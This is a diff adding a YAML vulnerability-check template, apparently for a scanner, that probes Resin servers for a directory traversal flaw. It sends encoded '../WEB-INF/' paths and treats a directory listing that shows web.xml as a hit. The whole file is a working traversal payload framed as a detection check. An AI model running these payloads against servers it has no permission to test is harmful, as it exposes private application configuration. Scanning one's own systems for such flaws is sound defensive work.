@@ -1,0 +1,21 @@
+id: poc-yaml-resin-directory-traversal
+info:
+  name: Resin 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: Resin
+  osprey-id: vb_2018_0040
+variables:
+  r_path: '/%20../WEB-INF/
+
+    /%c0%a0../WEB-INF/'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  headers: {}
+  expression: 'status_code == 200 && contains(body, "<li><a href=''web.xml''>web.xml</a>")
+    && contains(body, "<li><a href=''web''>web</a>")
+
+    '
+transport: http
